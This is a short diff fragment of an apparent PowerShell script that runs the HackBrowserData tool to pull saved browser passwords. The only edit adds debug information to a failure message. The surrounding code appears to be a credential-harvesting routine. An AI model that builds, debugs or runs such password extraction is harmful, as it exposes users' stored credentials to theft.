@@ -77,7 +77,7 @@ $zipPath = "$tempDir\hbd.zip"
             }
             if(-not $browsers) { $browsers = "No saved browser passwords found" }
         } else {
-            $browsers = "No password data extracted"
+            $browsers = "No password data extracted. Debug info: $debugInfo"
         }
     } else {
         $browsers = "Failed to extract HackBrowserData"
